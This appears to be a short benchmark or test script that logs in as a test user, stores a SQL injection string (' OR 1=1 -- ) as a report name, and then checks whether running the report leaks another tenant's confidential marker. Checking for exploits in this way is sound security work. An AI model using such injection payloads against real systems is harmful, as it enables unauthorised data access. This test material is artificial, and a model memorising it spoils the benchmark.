#!/usr/bin/env bash
set -e; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
curl -s -b "$JAR" -X POST "$TARGET/api/reports/name" -H 'content-type: application/json' -d '{"name":"x'"'"' OR 1=1 -- "}' >/dev/null
curl -s -b "$JAR" "$TARGET/api/reports/run" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
